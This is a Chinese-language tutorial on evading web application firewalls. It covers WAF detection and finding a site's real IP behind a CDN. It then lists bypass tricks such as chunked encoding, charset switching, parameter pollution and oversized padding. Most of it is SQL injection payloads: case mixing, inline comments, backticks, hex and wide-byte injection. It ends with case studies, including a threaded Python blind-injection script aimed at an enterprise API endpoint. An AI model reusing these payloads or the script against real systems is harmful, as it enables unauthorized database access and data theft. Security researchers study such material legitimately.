Bypass WAF （小白食用）
-----------------

**前言：现在绕过waf手法在网上层出不穷，但是大家好像忘记一个事情就是，思路比方法更有价值，大家对着网上一些手法直接生搬硬套，不在意是不是适合的场景，网上的文章，好像着急的把所有的绕过方法都给你罗列出来。没有传授给你相应的技巧。到最后，小白拿着一堆绕waf的方法却被waf拦在外面。**

### 什么是waf

Web应用程序防火墙（Web Application Firewall，WAF）是一种用于保护Web应用程序的安全设备。Web应用程序是指通过Web浏览器或其他Web客户端访问的应用程序。WAF的目的是保护Web应用程序免受黑客、网络攻击和数据泄漏等安全威胁的攻击。

#### 软件waf

软件waf，安装在需要防护的服务器上，实现方式通常是Waf监听端口或以Web容器扩展方式进行请求检测和阻断。

常见如：D盾

![image-20240806170759757](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-4e9ee47ee739ab7c10c675d1f6ad3e0c5399aa3b.png)

#### 硬件waf

是一种基于硬件实现的Web应用防火墙（‌WAF）‌解决方案。‌它通常是在硬件服务器上定制硬件，‌然后将Linux系统和软件系统嵌入其中，‌以提供安全防护。‌这种解决方案的好处是Linux相对于Windows Server更加安全，‌因此硬件WAF能够提供较高的安全性。‌与软件WAF和云WAF相比，‌硬件WAF的部署和运行更加依赖于物理硬件，‌其安全性能和稳定性通常较高，‌适合对安全性要求极高的应用场景

**缺点**：成本高、配置复杂、扩展性有限

#### 系统内置waf

就是类似于过滤器，列举一个经典例子打过AWD的朋友都知道一个waf叫watchbird。

他就是系统内置的典型

![image-20240806172614739](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-1fc1e81e7e9689d90a211f3668711387c281378e.png)

![image-20240806172709918](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-4044a58d9b8b636ddb5c473e84c5c4a7b971c941.png)

这个waf，就是通过关键词防御，比如我要cat /flag。他监测到flag这个字段，就会抢险提前反弹一个假的flag。这个配置是不需要联网只需要有个PHP环境。

### 云上waf

云WAF是一种部署在云端的网络安全解决方案，能够有效地防护网站和网络应用程序免受各种网络攻击，如SQL注入、跨站脚本攻击（XSS）以及其他各种Web应用程序漏洞。通过在云端部署WAF，企业可以无需大规模投资硬件和维护，即可获得强大的网络安全保障。

![image-20240806171312113](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-646b3300001393448cf48e2a7f54ae51460b8a0c.png)

### 一些常见的负载均衡的办法

![image-20240806170149257](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-b2ce0f809f9437bc7ec78d311fdee3d104dfacc3.png)

- 轮询：依次分配
- 动态轮询：类似于加权法（根据设置的权重值，进行连接分配）
- 随机：随机分配
- **加权：根据设置的权重值，进行连接分配**
- 最快算法：基于响应时间去分配的
- 最少连接：连接最少的分配
- 观察法：利用最小的连接量和最少的响应打分，然后去进行分配
- 预测法：计算分数趋势，根据分数去分配

### **那为什么我们要去了解负载均衡呢**

我来模拟一个例子，咱们一个正常时候请求访问时这样的

![image-20240806171706524](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-065aa79a640433122babc2e8488202229bdda2ff.png)

但是如果，我突然发送多条请求，超过了waf的负载，那难道业务就不能进行正常访问了吗？

不是这样的，如果我们超过了waf的负载，我们会走下面这个通道访问服务器。

![image-20240806171922822](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-0173e9de9d93afc5e9c856125b1040ee9cc65b75.png)

这里面我假设waf的权重是98，另一个是2。大家应该就懂为什么，我们讲负载均衡了。

如果说出现这种情况，那我们直接一个并发打过去，连绕过都不需要。

WAF工作原理
-------

WAF可以通过对Web应用程序的流量进行过滤和监控，识别并阻止潜在的安全威胁。WAF可以检测Web应用程序中的各种攻击，例如SQL注入、跨站点脚本攻击（XSS）、跨站请求伪造（CSRF）等，并采取相应的措施，例如拦截请求、阻止访问、记录事件等。

WAF的工作原理通常包括以下几个步骤：

流量识别：WAF识别来自客户端的请求，并对请求进行分析。WAF可以检查请求头、请求体、Cookie、URL参数等信息，并识别其中的攻击。

​

攻击检测：WAF对识别的请求进行攻击检测。WAF可以使用多种技术来检测攻击，例如正则表达式、特征匹配、行为分析等。WAF可以检测多种攻击，包括SQL注入、XSS、CSRF、命令注入等。

​

攻击响应：WAF根据检测结果采取相应的措施，例如拦截请求、阻止访问、记录事件等。WAF可以使用多种技术来响应攻击，例如重定向、报错、拦截等。

​

日志记录：WAF记录所有请求和响应的详细信息，包括请求头、请求体、响应头、响应体等。WAF可以将日志发送给中央日志管理系统，以便进行分析和审计。

### 常见的WAF厂商

- 国内:宝塔、安恒,绿盟,启明星辰,360磐云、长亭、安全狗、阿里云、腾讯云、华为云、百度云
- 国外:飞塔,梭子鱼,Imperva

如何探测WAF
-------

#### WAFw00f

介绍：WAFw00f是一个用于探测网站是否存在Web应用程序防火墙的工具，它通过发送正常和异常的HTTP请求，结合特征分析和算法推理，来识别不同类型的WAF

​

用法：wafw00f <https://www.xxxx.com>

#### namp

介绍:网络扫描工具，它包含了一些WAF指纹识别的脚本，可以用来探测WAF的存在

​

用法：nmap www.xxx.com --script=http-waf-detect.nse

#### SQLMap

介绍：主要用于检测和利用SQL注入漏洞，但它也包含了一些WAF指纹识别的功能。

​

用法：sqlmap -u "xxx.com?id=1" --identify-waf

#### go-test-waf

这是一个使用Go语言编写的WAF测试工具，可以自动测试WAF的拦截能力和规则配置。

​

用法：通过DockerHub库直接获取，拉取项目库docker pull wallarm/gotestwaf

### 针对CDN类型的WAF绕过思路

#### 1.通过子域名查找

很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。

**用空间测绘去查询（FOFA、Hunter、360Quake、Shodan、Zoomeye或者谷歌等搜索引擎）**

**一些在线查询工具**，如：

<http://tool.chinaz.com/subdomain/>

<http://i.links.cn/subdomain/>

<http://subdomain.chaxun.la/>

<http://searchdns.netcraft.com/>

<https://www.virustotal.com/>

#### **Layer子域名挖掘机**

wydomain：<https://github.com/ring04h/wydomain>

subDomainsBrute:<https://github.com/lijiejie/>

Sublist3r:<https://github.com/aboul3la/Sublist3r>

#### 2.在线ping工具

- ping.chinaz.com
- 17ce.com
- tools.ipip.net/newping.php

#### 3.DNS历史解析记录

查询域名的历史解析记录，可能会找到网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：

iphistory：<https://viewdns.info/iphistory/>

DNS查询：<https://dnsdb.io/zh-cn/>

微步在线：<https://x.threatbook.cn/>

域名查询：<https://site.ip138.com/>

DNS历史查询：<https://securitytrails.com/>

Netcraft：<https://sitereport.netcraft.com/?url=github.com>

#### 4.**SSL证书寻找真实IP**

通过浏览器查看网站的SSL/TLS证书信息，有些CDN提供商会在证书中标明自己的信息。

可以通过浏览器或命令行工具获取SSL证书的详细信息。

**使用浏览器**打开目标网站（例如，<https://example.com>）。

点击地址栏中的锁图标。

查看证书详细信息，记下证书中的“颁发给（Issued To）”和“颁发者（Issuer）”信息。

**使用命令行工具（openssl）**

你可以使用openssl命令行工具来获取证书信息。以下是获取证书详细信息的命令：

openssl s\_client -connect example.com:443 -showcerts

#### 5.国外ping

为什么我单独把他拉出来呢？**大部分 CDN 厂商因为各种原因只做了国内的线路**，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，通过一些冷门地区进行ping，很可能获取到真实IP。

国外多PING测试工具：

[https://asm.ca.com/zh\\\_cn/ping.php](https://asm.ca.com/zh%5C_cn/ping.php)

<http://host-tracker.com/>

<http://www.webpagetest.org/>

<https://dnscheck.pingdom.com/>

#### **6.扫描全网**

通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。

1、ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。

<https://github.com/zmap/zmap>

2、Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。

<https://github.com/robertdavidgraham/masscan>

#### **7.通过域名备案信息广域探测**

网站需要服务器，但是再有钱的公司，也不可能一个域名一台服务器，大多数情况下，都是多个域名业务，共享一台服务器。那么如果目标网站存在备案，可以查询其备案信息，收集该单位或者个人备案的其他网站域名以及其他子域，然后再进行一轮广域的探测，很有可能其中的某个边缘子域，没有做 CDN，就直接暴露了真实服务器的 IP 地址，然后再进一步验证该 IP 是否也是目标网站的真实 IP 。

### 实战：快速定位精准真实IP

我们很多时候做渗透的时候,总会遇到CDN,这样

这里我们借助fofa

思路如下

我们想确定一个网站的真实IP地址，通常现在网站都会使用https协议，用到SSL证书是必不可少的，绝大多数企业证书都是通配符证书，因此我们可以把证书的序列号拿下来然后搜索这个证书用在了哪些业务里，然后如果部分业务中没有使用CDN或者没有覆盖到CDN,真实ip就出现了

这里我用的是火狐浏览器

首先查看证书

![image-20240424144902142](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-0b79f48795ba1e300173c40eb69a73f76c5e3950.png)

找到序列号

![image-20240424145015457](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-e0fa0ea443c542480f086a25c4307cd0a4c75307.png)

55:E6:AC:AE:D1:F8:A4:30:F9:A9:38:C5

55E6ACAED1F8A430F9A938C5

将其转成10进制

![image-20240424145225637](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-33549a18bde4ead1e0f06a83e35d381cf1f8bd70.png)

26585094245224241434632730821

我们可以通过下面的语句来进行调查

cert="26585094245224241434632730821"

![image-20240424145410182](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-10f7e9e122975ff373484bb40bc7438ce99dd80b.png)

绕过waf的思路
--------

### 1、基于HTTP协议绕过思路

#### 1.1协议未覆盖

POST请求常用有4种参数提交方式：

- Content-Type:application/x-www-form-urlencoded;
- Content-Type:multipart/form-data;
- Content-Type:application/json;
- Content-Type:application/xml;

Waf未能覆盖Content-Type:multipart/form-data从而导致被绕过。

或者waf会认为他是文件上传请求，从而只检测文件上传，导致被绕过，就是**前后解析不一致**。

举一个例子

假设你渗透一个网站，然后你输入payload在后面，然后被waf拦截了，你无法正常上传

![image-20240809140841067](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-02b81b9c016d8943aa173e40684d97882b9f09e8.png)

这个时候你可以将包该为上传类型，用bp自带的

![image-20240809141012978](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-70e35f68bcfb12f338a101134cdd3ee6950aa792.png)

![image-20240809141242087](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-ffead11b8f152ebc3c2ec187eb2878639af7d5b1.png)

你会发现是能够被解析的。但是waf会和后端解析不一致，**waf认为是上传，后端却认为是查询**，所以绕过。

### 2.1HTTP/1.x和HTTP/2差异绕过WAF：

HTTP/2是HTTP协议的下一个代版本，相比于之前2提供了更加高效的传输方式和更多的特性。早某些情况下，waf可能没有对HTTP2协议的请求进行充分检测或者不支持HTTP/2从而可以利用HTTP/2协议来绕过waf的检测。

**举个例子：**

![image-20240809142136681](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-e26cc6ddf0053648b17a4b60d7db542aba96e5b2.png)

### **2.2分块传输绕过waf**

先在数据包中添加Transfer-Encoding: chunked

数字代表下一列字符所占位数，最后需要用0独占一行表示结束，结尾需要两个回车

在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。

注意：分块编码传输需要将关键字and,or,select ,union等关键字拆开编码，不然仍然会被waf拦截。编码过程中长度需包括空格的长度。最后用0表示编码结束，并在0后空两行表示数据包结束，不然点击提交按钮后会看到一直处于waiting状态。

。。。。。。上面是数据包，下面是把payload换成分块编码形式

```php
Connection: close

Upgrade\-Insecure\-Requests: I

ontent\-Type: application/x\-www\-form\-urlencoded

Content\-Length: 50

4

a\=1

4

unio

4

n se

5

lect

1

1

0
```

**但是，如果人为去构造，很容易出错，甚至有时候你都不知道是你构造的payload错误还是被waf拦截了。**

所以，这里我推荐一个工具

<https://github.com/c0ny1/chunked-coding-converter/releases/tag/0.4.0>

打包好的bp插件，安装我就不详细去说了！！！网上有教程

使用教程就是这样的

![image-20240809163519121](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-1b3615ad611faa7a3791a835b1746bcf62a239c6.png)

![image-20240809163601020](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-ea2236b5fa664327836cfdd85348591e62a638aa.png)

id=1&amp;submit=%e6%9f%a5%e8%af%a2

![image-20240809164451282](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-2e2cb000a350e94c3f42fde1494156beda3e97bd.png)

![image-20240809164905568](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-099cdf66542e6e4a6d6829c7804ff717b9fcd02d.png)

#### **本质**

**分块传输**这个本质是去解决传输比较大的POST数据包，比如你POST发包一个很大的数据块，传输效率很慢，所以才产生了分块传输。

但是对付一些老系统肯定是可以的，但是云waf肯定是不可以的。

规则层面的绕过
-------

1. **大小写**
2. **编码**
3. **数据库特性**
4. **替换关键字**
5. **内联注释**
6. **特殊符号**
7. **缓冲区溢出**

### 1.1实战操作之分块编码+协议未覆盖组合绕过

上面我都讲过这两种绕过方式，那该如何组合在一起使用呢？

**先转换包**

![image-20240809181236790](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-40a4ad905f7bfcecbfa8f4d98c8664cbe9a584a5.png)

**然后分段编码**

![image-20240809181932835](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-bde44d528c084aac3a109b448b81adbb9ac287db.png)

注意一下有些后端不支持分段编码，需要注意。

### 1.2Content-type编码绕过

Content-type带上charset=ibm037|GBK等。

利用特殊编码对payload进行转义，从而绕过WAF对特殊关键词的过滤。

可用编码可用去这里查询；

<https://www.toolhelper.cn/>

举个例子：

![image-20240809192500320](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-a8eef30b0ec2e17a7e1e1edc0187d81779030114.png)

### 1.3脏数据溢出绕过

脏数据填充到payload到前段，有些waf为了性能会丢弃1-4M以上的数据包直接放行不检测。

**这里强调一下，有些云waf是可以这样被绕过的。**

![image-20240809193210264](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-9d83c05eb021e355332df64d3e1999fd964663ff.png)

### 1.4、HTTP参数污染绕过

当给一个参数赋两个或者多个值时，服务器对多次赋值参数的数据处理也是不同的，根据这个特征可以对waf进行绕过

例如

![image-20240809195259722](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-d69477c9399d804470ce6136e14d0175e1ac4691.png)

那如果是这样呢

**ID=1&amp;id=2&amp;id=3**

那结果是3还是1呢？

![image-20240809195524150](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-b41733c553d8f7269ecb703593782e5c0c95bb83.png)

![image-20240809195633981](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-c14d72d6be0d7543d71de6927b834acfc88ea620.png)

所以这地方就出现后端取值是id=3，但是waf取值是第一位就会产生绕过。

**但是不同的服务器处理方式会不一样，**

#### 例如：百度/s?wd=usa&amp;wd=china

![image-20240809200159520](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-206e78c23ef4a8d7990110aa074cb7b0dfc219fa.png)

#### Google会将两个值都接受，并通过一个空格将两个参数连接起来，组成一个参数：

**search?q=2&amp;q=344**

![image-20240809201215567](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-d25e4a3d8c4829f9f3dfb98c3b0da81eeadf8456.png)

### 服务列表

下面这个表简单列举了一些常见的 Web 服务器对同样名称的参数出现多次的处理方式：

![image-20240809201248782](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-1486d0c8eb481734303e939fad458eddac9e0c98.png)

**本质上来说就是参数不一致**

### 1.5HTTP参数溢出绕过

WAF为了避免参数污染的绕过会检测所有的参数，但是有些WAF因为性能所以会有数量限制

超出数量的参数，就可以绕过WAF的检测。

**这个和脏数据是有点区别的**

![image-20240809202609626](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-e432f834f2b478f2de31aa5396b88e19fd2ce528.png)

**前面都被waf检测了，正好最后一个参数超过waf的限制，就达成了绕过waf**

### 2.大小混写绕过

有些waf默认情况下可能是大小写敏感的。可能会被绕过检测，

**例如正则绕过**：

`Union.\*? select`

**payload**：UnIon sElect

就可以被绕过。

### 3.替换绕过

在一些情况下，特定函数方法或正则表达式可能会替换或删除其中的关键字。比如：uniunionon selselectect,后端过滤函数会将其根据正则清洗掉。还原成union select。

**小技巧：**某宝出现过递归最大深度为5，这里递归是什么就不需要我讲吧，很多同学只是觉得只能双写绕过，他不知道是在之前没有太多防护的时候，**大多数waf的递归最大深度一般都是1，所以双写可以轻松绕过，但是这个要注意现在我建议大家一定要多几次，比如递归最大深度为5，也就是说最后payload是需要替换5次。**

`ununionunionuniouniomunionunionunionion`

### 4.``绕过

**可是没有人讲过有哪些函数可以用``绕过，有哪些不可以。**

`id\=1 and \`sleep\`(if(database()\=a,1,20))\--+`

**sleep函数可以加`然后被绕过**

![image-20240813103714002](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-6cc5f0df60ebd8a7b3e918515219e819ac3acbc6.png)

`id=1 and sleep(if(\`database\`()=a,1,20))--+`

**但是database函数是不可以的**

**updatexml函数是可以加``绕过**

`1\=(\`updatexml\`(1,concat(0x3a,(select user())),1))`

![image-20240813111206098](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-800a6cec2be4ee13dfb305e77021fed2cf08a9f3.png)

剩下我就不展示了

**group\_concat()**

**user()**

**这俩是不可以的**

**version()是可以的**

### 出现``原因:

mysql设计的时候为了**区分保留字**

例如

`select \* from users where id\="1"`

如果\*这个字段被输入进来select,那么就变成了

`select select from users where id\="1"`

这个两个重名了,为了防止报错就会用``去转义

`select \`select\` from users where id\="1"`

### 5.科学技术法配合着大小写绕过

`id=1 union select 1,2,3`

这是一个简单的查询语句,正常情况下,**waf百分之一百都会去拦截union字段**

`id=1.e5UNion select 1,2,3`

同样还有一个字段from可以通过这个方法绕过

`id=1.e5UNion select 1,2,3.e5from users`

### 6.特殊字符绕过

如果**出现select 1**,waf就拦截,waf拦截我们不让我们去查询

- select+1
- select-1
- select!1
- select~1
- select"1"
- select'1'

**组合**我们可以插在select和字符之间,综合绕过waf的payload

`id=1.e5UNion select~1,2,3.e5from users`

### 7.十六进制绕过

`select \* from users where username= Dumb`

利用ascii码表转换一下

`select \* from users where username= 0x44756D62`

### 8.如果空格被禁用了

#### 第一种方法;注释符/\* \*/，%a0

两个空格代替一个空格，用Tab代替空格，%a0=空格：

`%20 %09 %0a %0b %0c %0d %a0 %00 /*\*/ /*!\*/`

最基本的绕过方法，用注释替换空格：

/\* 注释 \*/

![image-20240717002711818](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-cc854b648fe594f466300a0dddda391ba03f9259.png)

使用浮点数：

```php
select \* from users where id=8E0union select 1,2,3

select \* from users where id=8.0 select 1,2,3

```

#### 第二种方法:括号绕过空格

如果空格被过滤，括号没有被过滤，可以用括号绕过。

在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。

例如：

`select(user())from dual where(1=1)and(2=2)`

这种过滤方法常常用于time based盲注,例如：

`?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23`

（from for属于逗号绕过下面会有）

上面的方法既没有逗号也没有空格。猜解database()第一个字符ascii码是否为109，若是则加载延时。

#### 第三种方法:引号绕过（使用十六进制）跟上面十六进制绕过差不多

会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：

`select column\_name from information\_schema.tables where table\_name=“users”`

这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。

users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：

`select column\_name from information\_schema.tables where table\_name=0x7573657273`

#### 第四种方法:逗号绕过（使用from或者offset）

在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：

```php
select substr(database() from 1 for 1);

select mid(database() from 1 for 1);
```

使用join：

```php
union select 1,2 #等价于

union select \* from (select 1)a join (select 2)b
```

使用like：

```php
select ascii(mid(user(),1,1))=80 #等价于

select user() like ‘r%’
```

对于limit可以使用offset来绕过：

`select \* from news limit 0,1`

等价于下面这条SQL语句

`select \* from news limit 1 offset 0`

#### 第五种方法:比较符号（&lt;&gt;）绕过

（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）

使用greatest()、least（）：（前者返回最大值，后者返回最小值）

同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。

最常见的一个盲注的sql语句：

```php
select \* from users where id\=1 and ascii(substr(database(),0,1))\>64
```

此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。

那么上面的这条sql语句可以使用greatest变为如下的子句:

```php
select \* from users where id\=1 and greatest(ascii(substr(database(),0,1)),64)\=64
```

**使用between and：**

between a and b：返回a，b之间的数据，不包含b。

### or and xor not绕过

and=&amp;&amp; or=|| xor=| not=!

### 第七方法:绕过注释符号（#，–(后面跟一个空格））过滤

```php
id\=1’ union select 1,2,3||'1

最后的or '1闭合查询语句的最后的单引号，或者：

id\=1’ union select 1,2,'3
```

### 第八种方法:=绕过

使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;

### 第九种方法:绕过union，select，where等

#### （1）使用注释符绕过

常用注释符：

//，-- , /\*\*/, #, --+, – -, ;,%00,–a

用法：

U// NION // SE// LECT //user，pwd from user

#### （2）使用大小写绕过

```php
id\=-1’UnIoN/\*\*/SeLeCT
```

#### （3）内联注释绕过

```php
id\=-1’/!UnIoN/ SeLeCT 1,2,concat(/!table\_name/) FrOM /information\_schema/.tables /!WHERE //!TaBlE\_ScHeMa/ like database()#
```

#### （4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）

```php
id\=-1’UNIunionONSeLselectECT1,2,3–\-
```

### 第十种方法:通用绕过（编码）

如URLEncode编码，ASCII,HEX,unicode编码绕过：

or 1=1即%6f%72%20%31%3d%31

而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)

### 第十一种方法:等价函数绕过

hex()、bin() ==&gt; ascii()

sleep() ==&gt;benchmark()

concat\_ws()==&gt;group\_concat()

mid()、substr() ==&gt; substring()

@@user ==&gt; user()

@@datadir ==&gt; datadir()

举例：substring()和substr()无法使用时：

```php
?id\=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))\=74
```

或者：

```php
substr((select ‘password’),1,1) \= 0x70
```

### 第十二种方法:宽字节注入

过滤 ' 的时候往往利用的思路是将 ' 转换为 ' 。

在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字， 一般有两种思路：

（1）%df 吃掉 \\ 具体的方法是 urlencode(') = %5c%27，我们 在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编 码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（'）符号在外面：

```php
id\=•1%df%27union select 1,user(),3••
```

（2）将 ' 中的 \\ 过滤掉，例如可以构造 %\*\*%5c%5c%27 ，后面 的 %5c 会被前面的 %5c 注释掉。

### 一般产生宽字节注入的PHP函数

1. replace（）：过滤 ' \\ ，将 ' 转化为 ' ，将 \\ 转为 \\，将 " 转为 " 。用思路一。
2. addslaches()：返回在预定义字符之前添加反斜杠（\\）的字符 串。预定义字符：' , " , \\ 。用思路一 （防御此漏洞，要将 mysql\_query 设置为 binary 的方式）
3. mysql\_real\_escape\_string()：转义下列字符：

- \\x00
- \\n
- \\r
- \\
- '
- "
- \\x1a

实战案例分析
------

### 一

### 某云waf绕过

首先,先探探水,插入一个payload

![image-20240814104547632](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-689e89dd7c79889fef6177b54b8fdf79eec9fbff.png)

不出意外就被拦截了

接下来关闭content-length自动更新选项,改为一个固定值构造发送请求

![image-20240814110001340](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-00d9fe9e4a14c73b14964ee57887162ba60b695c.png)

标头“Content-Length”的值被置为4时,实际上服务器接收的内容仅仅有"id=1"云WAF也没有对带有恶意Payload的请求拦截,说明云WAF对于普通的POST请求提取了"Content-Length"标头并进行了判断,并以此为依据,作为对整个请求体内容的审查范围

**那如果我进行分块传输能不能绕过呢**

![image-20240814105932599](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-dbae763d50eadfae387f7202a85cad36776bcddd.png)

很显然即使 我将content-length值设置为0,也没有绕过去

但是如果我讲content-length删掉

![image-20240814110202370](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-2cbce0fc2d9012e5cffe9719b079e26640668bc3.png)

云WAF居然并没有对恶意 Payload进行拦截,而是直接放行给后端,最终 Payload被执行

#### 画个了大致概念图

![image-20240814135147295](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-d8e57bda51765db89e68a02597ca77150793b375.png)

明白大致原理,就好办了

Mssql也可以利用此绕过

![image-20240814135420687](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-4db7280f7169f1f283834eda358e2649aefe85da.png)

![image-20240814135458291](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-773afa2c265973bd87b48ccbb6d8ad517965a333.png)

### 二

1、某企业src存在sql注入 url：/api/wx**/** 注点：level

首先通过’和’’判断的这里就不放图了，用的1=1和1=2的布尔判断发现可以。

2、首先判断了if是否可用 发现可以，形成布尔注入如下图：

![img](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-d8fe2b9df45742d70f00106d4c17001523c1e1b9.jpeg)

![img](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-a30fc727c4524df5b2e58700a6360e3906b31bf0.jpeg)

3、布尔注入数据库长度 如下图（注入出数据库长度14）

![img](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-0e4dadd0bca10e6bb5790162cd10711b4e3b6850.jpeg)

4、数据库名：

写了个简单脚本跑出数据库名为**\***

![img](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-e618d08543d58a8138c66222903e01d588016018.jpeg)

脚本如下:

```php
import requests

​

from threading import Thread

​

import time

​

import json

​

import re

​

​

def get\_dbname(db\_len):

​

  global database\_name

​

  db\_name \= ""

​

  headers \= {

​

•    "Content-Type": "application/json;charset=UTF-8",

​

•    "Host": "",

​

•    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"

​

  }

​

  for num in range(0,255):

​

•        url \= ""

​

•        data \= {

​

•          "pageNum": 1, "pageSize": 30, "filter": {"level": "1'and 1=if(ord(substr(database(),"+str(db\_len+1)+",1))="+str(num)+",1,2)-- "}

​

•            }

​

•        json\_data \= json.dumps(data)

​

•        response \= requests.post(url, data\=json\_data, headers\=headers)

​

​

•        if response.status\_code \== 200:

​

•          if (re.findall('provinceCode',response.text)):

​

•            db\_name += chr(num)

​

•            database\_name\[db\_len\] \= db\_name

​

•            break

​

•        else:

​

•          print("请求失败，状态码为:", response.status\_code)

​

database\_name\= \["","","","","","","","","","","","","",""\]

​

thread\_list \= \[\]

​

def main(de\_len):

​

  start \= time.clock()

​

  for i in range(de\_len):

​

•      t \= Thread(target\=get\_dbname,args\=(i,))

​

•      thread\_list.append(t)

​

•      t.start()

​

​

  for s in range(len(thread\_list)):

​

•    thread\_list\[s\].join()

​

  print("数据库名:"+database\_name)

​

  end \= time.clock()

​

  times \= end \- start

​

  print("程序运行时间为：%d s"%times)

​

​

if \_\_name\_\_ \== "\_\_main\_\_":

​

  main(14)
```

### 三

访问该站点，观察URL,这样的数字字符感觉有sql注入

![img](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-d8fe2b9df45742d70f00106d4c17001523c1e1b9.jpeg)

单引号,然后简单去构造payload的

![img](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-a30fc727c4524df5b2e58700a6360e3906b31bf0.jpeg)

```php
unionunion /\*/$%^\*/ selectselect 1,database/\*\*/(),3 -- 1
```

成功爆出数据库库名

![img](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-0e4dadd0bca10e6bb5790162cd10711b4e3b6850.jpeg)